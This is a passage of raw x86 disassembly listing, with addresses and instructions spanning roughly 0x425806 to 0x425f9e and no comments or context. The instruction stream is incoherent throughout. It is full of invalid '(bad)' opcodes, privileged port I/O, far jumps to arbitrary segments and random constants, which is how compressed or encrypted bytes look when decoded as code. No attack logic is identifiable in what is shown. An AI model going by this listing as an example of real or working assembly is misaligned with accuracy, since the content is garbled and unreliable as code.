  425806:	cmp    BYTE PTR [eax-0x58d3c455],0xd1
  42580d:	(bad)  
  42580e:	cld    
  42580f:	mov    bh,0x2b
  425811:	cmp    DWORD PTR [ebp+0x57ddc532],ebx
  425817:	jno    0x4257fa
  425819:	jb     0x4257ad
  42581b:	adc    eax,0x29c15dfd
  425820:	push   eax
  425821:	mov    ch,0xb5
  425823:	mov    esp,0x3ad3d231
  425828:	xor    BYTE PTR [edi],ch
  42582a:	clc    
  42582b:	nop
  42582c:	(bad)  
  42582d:	shl    BYTE PTR [ecx+eiz*1-0x62bdc7be],1
  425834:	je     0x425845
  425836:	dec    esi
  425837:	stos   DWORD PTR es:[edi],eax
  425838:	call   0x2c2efd66
  42583d:	xor    DWORD PTR [ebp+0xa],esi
  425840:	mov    bh,0x63
  425842:	add    edx,0xffffffd9
  425845:	add    DWORD PTR [ebx-0x7a],edi
  425848:	mov    cl,0xde
  42584a:	or     esi,edx
  42584c:	and    eax,DWORD PTR [ecx+0x8]
  42584f:	cmp    al,BYTE PTR [edx-0x4e7a32ba]
  425855:	sbb    DWORD PTR [ebx],0xf0960a1f
  42585b:	mov    edx,0x7250cd78
  425860:	cmp    ah,BYTE PTR [eax+0x55]
  425863:	or     eax,0x1bf176db
  425868:	mov    bh,0x7a
  42586a:	and    ah,al
  42586c:	ja     0x425827
  42586e:	retf   0xc7bc
  425871:	idiv   DWORD PTR [edx-0xf210898]
  425877:	mov    DWORD PTR [esi-0x160cb260],esi
  42587d:	sahf   
  42587e:	outs   dx,BYTE PTR ds:[esi]
  42587f:	rcl    BYTE PTR [ecx+0x53347850],0xc
  425886:	sbb    al,0x42
  425888:	fld    DWORD PTR [esi-0x6b]
  42588b:	or     eax,0xfa77338e
  425890:	into   
  425891:	sub    DWORD PTR [esi-0x3],eax
  425894:	mov    esp,0x1f8aa712
  425899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42589a:	push   ss
  42589b:	inc    esi
  42589c:	and    DWORD PTR [ebx-0x3],edi
  42589f:	sub    DWORD PTR [edx-0x2b384432],esp
  4258a5:	cmp    DWORD PTR [ebx+0x7b68a1ed],0xf
  4258ac:	das    
  4258ad:	push   ss
  4258ae:	mov    bl,0x51
  4258b0:	mov    eax,ds:0xb682f2e7
  4258b5:	pop    ebx
  4258b6:	xor    DWORD PTR [ebx-0x1],edx
  4258b9:	mov    cl,0x67
  4258bb:	in     al,dx
  4258bc:	cwde   
  4258bd:	push   ecx
  4258be:	dec    ebx
  4258bf:	inc    ebp
  4258c0:	ins    BYTE PTR es:[edi],dx
  4258c1:	into   
  4258c2:	pop    eax
  4258c3:	add    eax,0x94f1b78e
  4258c8:	addr16 inc ebp
  4258ca:	std    
  4258cb:	jbe    0x425940
  4258cd:	cmova  esp,DWORD PTR ds:0x55dc5d11
  4258d4:	fstp   DWORD PTR [edx+0x21d815bd]
  4258da:	(bad)  
  4258db:	icebp  
  4258dc:	stos   DWORD PTR es:[edi],eax
  4258dd:	and    ecx,DWORD PTR [edi]
  4258df:	mov    ebx,0x4d9998e9
  4258e4:	pop    edx
  4258e5:	push   esp
  4258e6:	xor    esp,DWORD PTR [edx+0xd011812]
  4258ec:	or     DWORD PTR [ebx-0x32df8047],0x444876a4
  4258f6:	rol    DWORD PTR [ecx-0x791db590],0x1e
  4258fd:	sbb    cl,BYTE PTR ds:0x6e1af6f4
  425903:	(bad)  
  425905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425906:	into   
  425907:	pop    ebp
  425908:	or     ebx,DWORD PTR [edx+0x1edcbcfa]
  42590e:	inc    eax
  42590f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425911:	mov    cl,BYTE PTR [edi+0x51]
  425914:	mov    ds:0x23c3af90,eax
  425919:	jecxz  0x425958
  42591b:	jl     0x425906
  42591d:	cmp    BYTE PTR ds:0x580ce5db,bl
  425923:	mov    bl,0x78
  425925:	inc    BYTE PTR [eax-0x25cf66e8]
  42592b:	xchg   edx,eax
  42592c:	or     DWORD PTR [ebp+0x30e31dd4],edx
  425932:	and    dh,dh
  425934:	loop   0x42598d
  425936:	test   BYTE PTR [ebp+eax*1+0x125a4ced],ch
  42593d:	int    0xe7
  42593f:	fst    DWORD PTR [edi-0x3338012]
  425945:	sbb    DWORD PTR [eax+ecx*8],ebp
  425948:	rcr    BYTE PTR [ecx+0x28c75108],0x98
  42594f:	xchg   ecx,eax
  425950:	pop    esp
  425951:	sbb    eax,0x55189ebf
  425956:	fidiv  DWORD PTR [edi-0x79]
  425959:	xor    eax,0x1bb1aa62
  42595e:	or     BYTE PTR [eax-0x41],dh
  425961:	arpl   bx,ax
  425963:	sub    eax,0x541ae4ba
  425968:	int    0x5
  42596a:	xchg   esp,eax
  42596b:	cwde   
  42596c:	adc    eax,0xa8ecbc65
  425971:	jns    0x42593c
  425973:	sbb    BYTE PTR [edx+0x38eaf2c4],0x8
  42597a:	pop    edi
  42597b:	lods   eax,DWORD PTR ds:[esi]
  42597c:	inc    edi
  42597d:	fnstsw WORD PTR [esp+edx*1-0x2d]
  425981:	jecxz  0x4259d7
  425983:	pop    eax
  425984:	mov    esp,0xeaa65eb9
  425989:	fidiv  DWORD PTR [ecx+0x0]
	...
  4259a7:	add    BYTE PTR [eax],al
  4259a9:	add    BYTE PTR [edx+0x43],cl
  4259ac:	push   ebp
  4259ad:	push   esi
  4259ae:	pop    ebp
  4259af:	push   esi
  4259b0:	dec    ebx
  4259b1:	pop    edi
  4259b2:	idiv   bl
  4259b4:	(bad)  
  4259b8:	jle    0x4259d6
  4259ba:	loopne 0x4259a1
  4259bc:	add    DWORD PTR [eax],eax
  4259be:	mov    DWORD PTR [esi],eax
  4259c0:	add    BYTE PTR [eax],al
  4259c2:	add    DWORD PTR [ebx+0x1b21fe5],esp
  4259c8:	dec    esi
  4259c9:	push   edx
  4259ca:	cmp    edx,DWORD PTR [ecx+0xca398cb]
  4259d0:	and    DWORD PTR [ecx-0x64],ebp
  4259d3:	mov    WORD PTR [ecx-0x63],?
  4259d6:	sub    eax,0xfb5aeb5a
  4259db:	fld    QWORD PTR [ecx]
  4259dd:	and    al,0x6
  4259df:	mov    al,al
  4259e1:	aaa    
  4259e2:	mov    eax,ds:0xf846f2db
  4259e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259e8:	das    
  4259e9:	mov    bl,0x3e
  4259eb:	bound  eax,QWORD PTR [esi-0x2b]
  4259ee:	add    ch,BYTE PTR ds:0xa82e08a9
  4259f4:	(bad)  
  4259f5:	sub    al,0x7
  4259f7:	xchg   esi,eax
  4259f8:	scas   al,BYTE PTR es:[edi]
  4259f9:	push   edx
  4259fa:	push   ecx
  4259fb:	sub    al,0x2f
  4259fd:	push   esi
  4259fe:	popa   
  4259ff:	or     cl,bl
  425a01:	mov    ecx,0xebcd8787
  425a06:	xor    al,0xde
  425a08:	hlt    
  425a09:	gs jg  0x4259ad
  425a0c:	gs mov bh,0x2
  425a0f:	lea    esp,[ecx+ebx*4-0x7faabe39]
  425a16:	out    dx,eax
  425a17:	and    edx,DWORD PTR [ebx]
  425a19:	push   es
  425a1a:	pop    esp
  425a1b:	and    DWORD PTR [ebp-0x15],esp
  425a1e:	sti    
  425a1f:	repnz test DWORD PTR ds:0x119dbeb2,esi
  425a26:	or     BYTE PTR [edx],dl
  425a28:	jno    0x425a55
  425a2a:	xchg   esp,eax
  425a2b:	int3   
  425a2c:	mov    ebx,0x2bfaf1a8
  425a31:	loop   0x4259b6
  425a33:	loop   0x425a54
  425a35:	mov    ebp,0x800372a
  425a3a:	addr16 mov ecx,0xf6d734ac
  425a40:	jae    0x425a39
  425a42:	leave  
  425a43:	mov    ch,0xb5
  425a45:	xlat   BYTE PTR ds:[ebx]
  425a46:	inc    esp
  425a47:	cmp    al,0x89
  425a49:	lahf   
  425a4a:	icebp  
  425a4b:	retf   0x3d19
  425a4e:	mov    ebx,0x49b91828
  425a53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a54:	sbb    edi,DWORD PTR [eax+0x53273594]
  425a5a:	in     eax,dx
  425a5b:	aam    0x59
  425a5d:	adc    eax,0x2dc40877
  425a62:	pop    ds
  425a63:	cmc    
  425a64:	pushf  
  425a65:	shl    BYTE PTR [esi+0x14bdb61b],0x3
  425a6c:	lea    esi,[edx]
  425a6e:	xchg   edx,eax
  425a6f:	dec    esi
  425a70:	mov    ecx,0xfd4d591d
  425a75:	shl    DWORD PTR [edi+0x4d],0x79
  425a79:	mov    DWORD PTR ss:[ebp-0x35],ebp
  425a7d:	mov    dh,0xa1
  425a7f:	in     eax,dx
  425a80:	dec    esi
  425a81:	shl    dl,cl
  425a83:	dec    esp
  425a84:	add    bh,BYTE PTR [eax+0x2a]
  425a87:	fmul   QWORD PTR [ebp-0x40]
  425a8a:	loopne 0x425a55
  425a8c:	xchg   edx,eax
  425a8d:	pop    ebx
  425a8e:	jl     0x425a7f
  425a90:	add    eax,0x9b9f522f
  425a95:	fcomp  QWORD PTR [ecx-0x25]
  425a98:	imul   eax,DWORD PTR [esi],0xe307626
  425a9e:	sub    bh,ah
  425aa0:	lock (bad) 
  425aa2:	retf   
  425aa3:	xlat   BYTE PTR ds:[ebx]
  425aa4:	sub    al,0xee
  425aa6:	pushf  
  425aa7:	and    DWORD PTR [edi-0x4b4c4e15],ebp
  425aad:	pushf  
  425aae:	sub    ah,BYTE PTR [edx]
  425ab0:	int3   
  425ab1:	mov    ecx,0x27098668
  425ab6:	mov    ah,0xc5
  425ab8:	adc    dh,ch
  425aba:	stos   BYTE PTR es:[edi],al
  425abb:	push   edi
  425abc:	mov    DWORD PTR [ebx+eax*4-0x4a],eax
  425ac0:	shl    dh,0x8b
  425ac3:	icebp  
  425ac4:	pop    ss
  425ac5:	scas   al,BYTE PTR es:[edi]
  425ac6:	outs   dx,BYTE PTR ds:[esi]
  425ac7:	aaa    
  425ac8:	cmp    al,0x2f
  425aca:	add    DWORD PTR [ebp-0x604fbd43],edi
  425ad0:	aas    
  425ad1:	or     DWORD PTR [edx+0x1e],0x22e449f8
  425ad8:	ds retf 
  425ada:	mov    es,edx
  425adc:	not    edi
  425ade:	out    0x22,al
  425ae0:	out    0x7a,al
  425ae2:	stos   DWORD PTR es:[edi],eax
  425ae3:	js     0x425b4c
  425ae5:	sahf   
  425ae6:	or     ah,ah
  425ae8:	cs inc esi
  425aea:	add    al,0x8a
  425aec:	sub    al,0xca
  425aee:	jmp    0xcae7:0x978077b4
  425af5:	push   cs
  425af6:	imul   edi,DWORD PTR [edx-0x1b],0x51
  425afa:	nop
  425afb:	aaa    
  425afc:	scas   al,BYTE PTR es:[edi]
  425afd:	call   FWORD PTR [eax-0x1176c8b8]
  425b03:	sub    al,0xa2
  425b05:	jmp    0x425aa6
  425b07:	in     al,dx
  425b08:	jbe    0x425b4c
  425b0a:	adc    edi,DWORD PTR [esi+esi*1-0x1]
  425b0e:	dec    esp
  425b0f:	mov    cl,0x16
  425b11:	in     al,dx
  425b12:	popf   
  425b13:	in     al,dx
  425b14:	scas   eax,DWORD PTR es:[edi]
  425b15:	ins    BYTE PTR es:[edi],dx
  425b16:	inc    edi
  425b17:	sbb    eax,0x4cd8b225
  425b1c:	lods   al,BYTE PTR ds:[esi]
  425b1d:	ret    
  425b1e:	push   ebx
  425b1f:	retf   
  425b20:	in     al,dx
  425b21:	rcr    DWORD PTR [edx],0x6d
  425b24:	loop   0x425b65
  425b26:	call   0x4703:0xab80ad21
  425b2d:	mov    ah,0x75
  425b2f:	jp     0x425ab7
  425b31:	or     cl,dh
  425b33:	dec    ecx
  425b34:	pop    edi
  425b35:	push   ebx
  425b36:	in     eax,dx
  425b37:	mov    ds:0x8a59cd69,eax
  425b3c:	mov    esi,DWORD PTR [eax+0x721a1c74]
  425b42:	jo     0x425ae3
  425b44:	out    dx,eax
  425b45:	call   0x7d45a609
  425b4a:	test   al,0x63
  425b4c:	in     al,dx
  425b4d:	ds xchg esi,eax
  425b4f:	(bad)  
  425b50:	imul   edx,DWORD PTR [esp+eax*4],0x7b
  425b54:	pop    esp
  425b55:	imul   edi,ebp,0x4fd8beb7
  425b5b:	dec    edx
  425b5c:	aad    0x26
  425b5e:	sbb    BYTE PTR [edi+0x33],bl
  425b61:	lea    edx,[eax+0x207e3197]
  425b67:	xchg   edx,eax
  425b68:	in     eax,dx
  425b69:	mov    ds:0x3238e41b,eax
  425b6e:	cld    
  425b6f:	dec    esp
  425b70:	push   esp
  425b71:	imul   BYTE PTR [eax+ebx*4]
  425b74:	lahf   
  425b75:	push   ecx
  425b76:	or     esi,edi
  425b78:	inc    edx
  425b79:	nop
  425b7a:	ret    0x74dc
  425b7d:	test   DWORD PTR [edi],ebx
  425b7f:	add    bl,BYTE PTR [edx-0xf]
  425b82:	push   0xffffff99
  425b84:	mov    bh,0xa0
  425b86:	loop   0x425c02
  425b88:	fisub  DWORD PTR [edx+ebp*2-0x57e23665]
  425b8f:	inc    edi
  425b90:	rol    DWORD PTR [ebx+0x71],1
  425b93:	ror    BYTE PTR [ebp-0x25],0x16
  425b97:	and    DWORD PTR [eax-0x58],0x21
  425b9b:	cmc    
  425b9c:	inc    eax
  425b9d:	pop    ds
  425b9e:	mov    ah,0x48
  425ba0:	data16 adc al,0x1f
  425ba3:	cdq    
  425ba4:	test   BYTE PTR [edi+0x5582dd94],ah
  425baa:	out    dx,eax
  425bab:	jnp    0x425bb0
  425bad:	pusha  
  425bae:	adc    DWORD PTR [ecx+0x19],edx
  425bb1:	and    al,0x49
  425bb3:	(bad)  
  425bb4:	pop    ds
  425bb5:	lods   al,BYTE PTR ds:[esi]
  425bb6:	mov    edi,0x3f912047
  425bbb:	stos   BYTE PTR es:[edi],al
  425bbc:	adc    BYTE PTR [edi+0x5d6879da],dh
  425bc2:	mov    cl,0xcd
  425bc4:	jbe    0x425bc1
  425bc6:	jg     0x425b51
  425bc8:	ret    0x49cf
  425bcb:	and    ah,ah
  425bcd:	test   al,0xcc
  425bcf:	inc    edx
  425bd0:	jo     0x425c0e
  425bd2:	lock aas 
  425bd4:	mov    BYTE PTR [esp+ebx*1-0x1d],bl
  425bd8:	es cmp al,0xcc
  425bdb:	mov    ecx,0x6fe451a
  425be0:	jae    0x425bf9
  425be2:	inc    ebx
  425be3:	pusha  
  425be4:	dec    esi
  425be5:	push   ss
  425be6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425be7:	cmp    ebp,DWORD PTR [eax]
  425be9:	xor    al,0xda
  425beb:	std    
  425bec:	mov    edi,0xeb2f9023
  425bf1:	int3   
  425bf2:	popa   
  425bf3:	pusha  
  425bf4:	daa    
  425bf5:	mov    DWORD PTR [ebx-0x44],0xb7c6c7ce
  425bfc:	add    BYTE PTR [esi],ch
  425bfe:	push   esi
  425bff:	push   eax
  425c00:	std    
  425c01:	sub    BYTE PTR [ebx],bh
  425c03:	mov    al,ds:0xda574e74
  425c08:	xchg   esp,eax
  425c09:	lods   al,BYTE PTR ds:[esi]
  425c0a:	test   eax,0xfd5a56b5
  425c0f:	test   bh,dh
  425c11:	iret   
  425c12:	sub    esi,esi
  425c14:	jne    0x425c51
  425c16:	inc    edi
  425c17:	push   0x373bfdd8
  425c1c:	add    dl,BYTE PTR [esi-0x71]
  425c1f:	xor    ebp,ebp
  425c21:	lods   eax,DWORD PTR ds:[esi]
  425c22:	mov    ch,0x32
  425c24:	test   BYTE PTR [ecx-0x2fc9bc8a],cl
  425c2a:	bound  eax,QWORD PTR [ecx+0x6f]
  425c2d:	ins    DWORD PTR es:[edi],dx
  425c2e:	stos   DWORD PTR es:[edi],eax
  425c2f:	cmp    BYTE PTR [eax+0x1baa6eef],0x2b
  425c36:	or     ah,dl
  425c38:	mov    dl,0x36
  425c3a:	jno    0x425cad
  425c3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c3d:	or     DWORD PTR ds:[esi],edx
  425c40:	add    ebx,DWORD PTR [eax+0x68]
  425c43:	pop    eax
  425c44:	enter  0x5459,0x56
  425c48:	in     al,dx
  425c49:	(bad)  
  425c4a:	mov    cl,0x4c
  425c4c:	ins    DWORD PTR es:[edi],dx
  425c4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c4e:	push   ebp
  425c4f:	pop    edi
  425c50:	and    BYTE PTR [edi],dh
  425c52:	scas   eax,DWORD PTR es:[edi]
  425c53:	sbb    BYTE PTR [edx],dl
  425c55:	jmp    0xf9fb:0x6a4f47ac
  425c5c:	sahf   
  425c5d:	cmp    BYTE PTR [ebx],dh
  425c5f:	inc    eax
  425c60:	mov    eax,ds:0xf202b96e
  425c65:	out    dx,eax
  425c66:	sub    DWORD PTR [ecx],eax
  425c68:	mov    ch,0x31
  425c6a:	stos   DWORD PTR es:[edi],eax
  425c6b:	sub    al,0x8c
  425c6d:	xchg   ebx,eax
  425c6e:	mov    dh,0x17
  425c70:	xchg   ecx,eax
  425c71:	jp     0x425c0f
  425c73:	scas   eax,DWORD PTR es:[edi]
  425c74:	mov    ds:0x466125a5,al
  425c79:	or     eax,0x139fb431
  425c7e:	inc    esi
  425c7f:	xlat   BYTE PTR ds:[ebx]
  425c80:	stos   DWORD PTR es:[edi],eax
  425c81:	fimul  DWORD PTR [esi-0x43128b44]
  425c87:	push   cs
  425c88:	dec    edi
  425c89:	jl     0x425cc1
  425c8b:	sbb    al,BYTE PTR [ebx+0x6]
  425c8e:	shl    BYTE PTR [ebx],cl
  425c90:	xlat   BYTE PTR ds:[ebx]
  425c91:	mov    edx,0x89a1b1d4
  425c96:	jg     0x425c32
  425c98:	(bad)  
  425c99:	fidiv  WORD PTR [edx]
  425c9b:	and    al,0xd5
  425c9d:	sahf   
  425c9e:	in     eax,0x57
  425ca0:	mov    ebp,DWORD PTR [ecx]
  425ca2:	xchg   ebp,eax
  425ca3:	shr    DWORD PTR [eax],0xb1
  425ca6:	mov    ebp,0xbe7b5341
  425cab:	dec    esp
  425cac:	xlat   BYTE PTR ds:[ebx]
  425cad:	push   esi
  425cae:	cmp    DWORD PTR [ebp-0x76],0xffffffdb
  425cb2:	dec    edx
  425cb3:	lahf   
  425cb4:	xchg   esi,eax
  425cb5:	push   edx
  425cb6:	int    0xb1
  425cb8:	retf   
  425cb9:	stos   BYTE PTR es:[edi],al
  425cba:	inc    ebp
  425cbb:	es and al,0xda
  425cbe:	push   0x7e686e28
  425cc3:	in     al,dx
  425cc4:	add    BYTE PTR [ecx],cl
  425cc6:	pop    eax
  425cc7:	pop    ss
  425cc8:	mov    ds:0xf2afd0ae,al
  425ccd:	add    bl,ch
  425ccf:	inc    esi
  425cd0:	adc    eax,0xd30fa0ce
  425cd5:	cld    
  425cd6:	ja     0x425ca1
  425cd8:	icebp  
  425cd9:	adc    al,0x9f
  425cdb:	mov    cs,edi
  425cdd:	xchg   edx,eax
  425cde:	mul    DWORD PTR [edx+ecx*2]
  425ce1:	mov    bl,0x6d
  425ce3:	mov    dl,0xcc
  425ce5:	(bad)  
  425ce6:	enter  0xcd2f,0x93
  425cea:	mov    ds:0x95ed2cb,al
  425cef:	stos   DWORD PTR es:[edi],eax
  425cf0:	cmp    bh,BYTE PTR [ebx]
  425cf2:	pusha  
  425cf3:	retf   
  425cf4:	cmp    eax,0xd06c174e
  425cf9:	(bad)  
  425cfa:	fdivr  DWORD PTR [esi+0x32]
  425cfd:	xlat   BYTE PTR ds:[ebx]
  425cfe:	pop    edi
  425cff:	fnstsw WORD PTR [edi+0x78d43079]
  425d05:	xor    DWORD PTR [esi+0x79e80045],0x65784f75
  425d0f:	rol    BYTE PTR [ebp-0x60c36446],0x95
  425d16:	into   
  425d17:	aad    0x20
  425d19:	leave  
  425d1a:	sbb    ebp,edi
  425d1c:	scas   eax,DWORD PTR es:[edi]
  425d1d:	mov    al,ds:0x1ab70666
  425d22:	jg     0x425d0e
  425d24:	ins    DWORD PTR es:[edi],dx
  425d25:	dec    edx
  425d26:	test   eax,0xd912e792
  425d2b:	sbb    al,0xba
  425d2d:	push   ds
  425d2e:	adc    ah,bl
  425d30:	loop   0x425d21
  425d32:	outs   dx,BYTE PTR ds:[esi]
  425d33:	jge    0x425cf5
  425d35:	daa    
  425d36:	push   esi
  425d37:	mov    BYTE PTR [esi-0x18abefec],ch
  425d3d:	sub    al,0xd3
  425d3f:	scas   eax,DWORD PTR es:[edi]
  425d40:	fwait
  425d41:	jmp    0x2d3e:0x4e51ad42
  425d48:	jno    0x425d44
  425d4a:	ret    
  425d4b:	int3   
  425d4c:	(bad)  
  425d4d:	test   DWORD PTR [edx-0x2f],0xcd48933a
  425d54:	loope  0x425d22
  425d56:	fsub   DWORD PTR [ebx]
  425d58:	int    0x7c
  425d5a:	inc    ecx
  425d5b:	fmul   DWORD PTR [eax+0x55fe21e5]
  425d61:	jmp    0xfc5eb1c0
  425d66:	lods   eax,DWORD PTR ds:[esi]
  425d67:	mov    ds:0x661e106,eax
  425d6c:	adc    eax,0xd91e5fed
  425d71:	cmc    
  425d72:	mov    edx,0xc6d8ef7
  425d77:	arpl   WORD PTR [edx],sp
  425d79:	pop    es
  425d7a:	sub    al,0x98
  425d7c:	xchg   ecx,eax
  425d7d:	jae    0x425d4a
  425d7f:	into   
  425d80:	cmp    al,0x39
  425d82:	rol    BYTE PTR ds:0x111107f7,1
  425d88:	dec    ebx
  425d89:	jle    0x425d1e
  425d8b:	mov    ebp,0x8ebdc8d7
  425d90:	mov    esi,0x179794da
  425d95:	sbb    al,0x67
  425d97:	retf   0x221c
  425d9a:	loopne 0x425d71
  425d9c:	pop    ecx
  425d9d:	sar    ebx,1
  425d9f:	xchg   ebp,eax
  425da0:	scas   eax,DWORD PTR es:[edi]
  425da1:	je     0x425d81
  425da3:	data16 lahf 
  425da5:	ins    BYTE PTR es:[edi],dx
  425da6:	xor    edx,DWORD PTR [edi*8-0x79cbb3aa]
  425dad:	push   es
  425dae:	les    esp,FWORD PTR [edi-0x37]
  425db1:	fidiv  DWORD PTR [esi-0x7443e286]
  425db7:	addr16 sahf 
  425db9:	jg     0x425d89
  425dbb:	scas   al,BYTE PTR es:[edi]
  425dbc:	imul   ecx,DWORD PTR [ebp+0x9],0x1d
  425dc0:	ja     0x425da7
  425dc2:	add    dl,bl
  425dc4:	pop    ebx
  425dc5:	mov    BYTE PTR [edi+0x7215677c],dh
  425dcb:	add    al,0xbd
  425dcd:	inc    ebx
  425dce:	and    BYTE PTR [edi-0x57e60b07],ah
  425dd4:	jmp    0x425db7
  425dd6:	adc    esp,edi
  425dd8:	push   edi
  425dd9:	jge    0x425dda
  425ddb:	mov    ch,0x82
  425ddd:	pop    esi
  425dde:	fadd   DWORD PTR [ebx+0x134fc7da]
  425de4:	inc    ebx
  425de5:	out    0xa0,al
  425de7:	adc    al,0x82
  425de9:	in     eax,dx
  425dea:	fsubr  QWORD PTR [ebx+0x5f]
  425ded:	xchg   esi,eax
  425dee:	push   esi
  425def:	and    cl,BYTE PTR [eax]
  425df1:	ffree  st(1)
  425df3:	clc    
  425df4:	ins    DWORD PTR es:[edi],dx
  425df5:	dec    eax
  425df6:	shl    DWORD PTR [eax-0x75b222ab],0x75
  425dfd:	sar    BYTE PTR [ebx-0x47dc08f4],0x7e
  425e04:	and    bl,dh
  425e06:	ret    
  425e07:	bound  edx,QWORD PTR [esi-0x1f]
  425e0a:	inc    eax
  425e0b:	adc    eax,0x3cfc8aa4
  425e10:	rol    DWORD PTR [ebp-0x2b8368b2],0xc6
  425e17:	xchg   ebp,eax
  425e18:	into   
  425e19:	sbb    dh,al
  425e1b:	and    al,0x97
  425e1d:	dec    eax
  425e1e:	(bad)  
  425e1f:	adc    eax,0xcd9f3c0b
  425e24:	nop
  425e25:	in     eax,0x9f
  425e27:	inc    edi
  425e28:	lds    ebp,FWORD PTR fs:[esi+0x49b6cbf8]
  425e2f:	inc    edi
  425e30:	dec    ebx
  425e31:	push   edi
  425e32:	push   0xe420629d
  425e37:	sbb    BYTE PTR [edx],bl
  425e39:	and    BYTE PTR [ebp+0x6b06b882],ch
  425e3f:	dec    edx
  425e40:	rcl    DWORD PTR [esi],1
  425e42:	fidivr DWORD PTR [ebx+eax*1+0x5d60dad2]
  425e49:	ja     0x425e07
  425e4b:	sbb    al,0x19
  425e4d:	and    al,0x9d
  425e4f:	mov    ecx,0xd78d3ec5
  425e54:	xchg   ecx,eax
  425e55:	mov    al,0xed
  425e57:	test   eax,0x130dff91
  425e5c:	xchg   ebx,eax
  425e5d:	daa    
  425e5e:	mov    ecx,0x8a53b607
  425e63:	sar    BYTE PTR [esi],0xfb
  425e66:	dec    edi
  425e67:	xor    al,0x16
  425e69:	xchg   esi,ecx
  425e6b:	(bad)  
  425e6c:	gs je  0x425ec9
  425e6f:	gs popa 
  425e71:	stos   BYTE PTR es:[edi],al
  425e72:	lods   al,BYTE PTR ss:[esi]
  425e74:	loope  0x425e48
  425e76:	in     al,0x40
  425e78:	mov    eax,ds:0x1c7f69a6
  425e7d:	push   edx
  425e7e:	out    0xdf,eax
  425e80:	dec    ebx
  425e81:	mov    BYTE PTR [ecx+esi*2+0x4de89cab],ch
  425e88:	adc    ecx,DWORD PTR [edx-0x64]
  425e8b:	mov    dl,0xba
  425e8d:	jo     0x425e19
  425e8f:	adc    DWORD PTR [eax],ebp
  425e91:	xchg   ecx,eax
  425e92:	push   esi
  425e93:	lock imul esp,esi,0x62
  425e97:	pop    esi
  425e98:	sbb    eax,0xe602c86a
  425e9d:	outs   dx,DWORD PTR ds:[esi]
  425e9e:	push   cs
  425e9f:	outs   dx,BYTE PTR ds:[esi]
  425ea0:	hlt    
  425ea1:	fmul   st,st(2)
  425ea3:	mov    al,ds:0xd79c4005
  425ea8:	pop    es
  425ea9:	aam    0xb3
  425eab:	mov    ds:0xa2bb71af,al
  425eb0:	shr    edx,cl
  425eb2:	pop    ecx
  425eb3:	inc    edx
  425eb4:	sti    
  425eb5:	outs   dx,DWORD PTR ds:[esi]
  425eb6:	out    0xeb,al
  425eb8:	sbb    DWORD PTR [esi+0xd81c835],ebp
  425ebe:	mov    dl,bl
  425ec0:	imul   esp,DWORD PTR [edi],0xed868cf5
  425ec6:	dec    BYTE PTR [edi+0x4b]
  425ec9:	and    eax,0xa0bfd694
  425ece:	adc    ah,BYTE PTR [edx]
  425ed0:	inc    DWORD PTR [edi-0x5bb03389]
  425ed6:	aad    0x2a
  425ed8:	arpl   WORD PTR [edx+0x42c92742],si
  425ede:	mov    ch,0xd0
  425ee0:	scas   eax,DWORD PTR es:[edi]
  425ee1:	or     BYTE PTR [ecx-0x37696943],al
  425ee7:	mov    eax,ds:0x2d2ccd1
  425eec:	cmc    
  425eed:	ja     0x425f6b
  425eef:	push   esi
  425ef0:	jbe    0x425ef3
  425ef2:	fwait
  425ef3:	test   al,0x70
  425ef5:	ja     0x425f5d
  425ef7:	scas   eax,DWORD PTR es:[edi]
  425ef8:	sbb    BYTE PTR [ebx],dh
  425efa:	adc    ch,BYTE PTR [edx-0x31]
  425efd:	cmp    eax,0x930ce2ae
  425f02:	adc    ch,BYTE PTR [ecx]
  425f04:	outs   dx,BYTE PTR ds:[esi]
  425f05:	int    0x25
  425f07:	and    dh,bh
  425f09:	sub    al,0x3b
  425f0b:	lods   eax,DWORD PTR ds:[esi]
  425f0c:	adc    ch,BYTE PTR [eax+eiz*2-0x22512e60]
  425f13:	hlt    
  425f14:	push   esp
  425f15:	dec    esi
  425f16:	jecxz  0x425eb1
  425f18:	xchg   ebx,eax
  425f19:	push   0xffffffae
  425f1b:	or     edi,0xffffffea
  425f1e:	inc    edi
  425f1f:	js     0x425f80
  425f21:	test   al,0x54
  425f23:	pop    ebp
  425f24:	mov    bh,0xd
  425f26:	sub    edx,DWORD PTR [eax-0x13]
  425f29:	sbb    eax,0x62783681
  425f2e:	jmp    DWORD PTR [ebp-0x68]
  425f31:	adc    BYTE PTR [edi-0x14e36b6a],ah
  425f37:	jno    0x425f91
  425f39:	iret   
  425f3a:	and    al,0x1f
  425f3c:	stos   BYTE PTR es:[edi],al
  425f3d:	ins    BYTE PTR es:[edi],dx
  425f3e:	jns    0x425f5c
  425f40:	ret    0x2712
  425f43:	add    DWORD PTR cs:[ebx],ecx
  425f46:	jg     0x425edd
  425f48:	add    dh,dh
  425f4a:	add    ch,0xaf
  425f4d:	sar    DWORD PTR [ebp+0x15],cl
  425f50:	ret    
  425f51:	jp     0x425ee2
  425f53:	push   esp
  425f54:	lods   eax,DWORD PTR ds:[esi]
  425f55:	sbb    al,0x9f
  425f57:	inc    eax
  425f58:	into   
  425f59:	xchg   ecx,edi
  425f5b:	(bad)  
  425f5c:	sub    eax,0x187c246b
  425f61:	into   
  425f62:	stos   BYTE PTR es:[edi],al
  425f63:	(bad)  
  425f64:	scas   eax,DWORD PTR es:[edi]
  425f65:	mov    bh,0x66
  425f67:	cdq    
  425f68:	add    eax,0x85fcc5b9
  425f6d:	rcl    BYTE PTR [edx+0x4a],1
  425f70:	pop    esp
  425f71:	cdq    
  425f72:	push   esp
  425f73:	je     0x425ef5
  425f75:	dec    ebp
  425f76:	rol    BYTE PTR [edi+0x4516ed40],1
  425f7c:	cmp    bl,BYTE PTR [eax+0x7ff06a0e]
  425f82:	adc    ah,BYTE PTR [edi]
  425f84:	lock in al,0x45
  425f87:	mov    cl,0xf0
  425f89:	or     dl,BYTE PTR ds:0xebad1946
  425f8f:	retf   0xb8a7
  425f92:	cli    
  425f93:	iret   
  425f94:	ficomp DWORD PTR [ebp-0x554ade68]
  425f9a:	stc    
  425f9b:	pop    edi
  425f9c:	sar    dh,cl
  425f9e:	dec    ebp
